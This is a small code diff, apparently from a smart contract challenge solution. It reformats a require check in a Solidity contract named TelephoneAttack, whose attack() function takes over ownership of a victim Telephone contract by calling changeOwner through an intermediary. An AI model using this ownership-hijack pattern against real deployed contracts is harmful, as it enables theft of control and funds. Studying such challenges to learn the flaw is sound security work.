@@ -14,9 +14,6 @@ contract TelephoneAttack {
     function attack() external {
         victimTelephone.changeOwner(msg.sender);
 
-        require(
-            msg.sender == victimTelephone.owner(),
-            "Telephone: Attack failed"
-        );
+        require(msg.sender == victimTelephone.owner(), "Telephone: Attack failed");
     }
 }
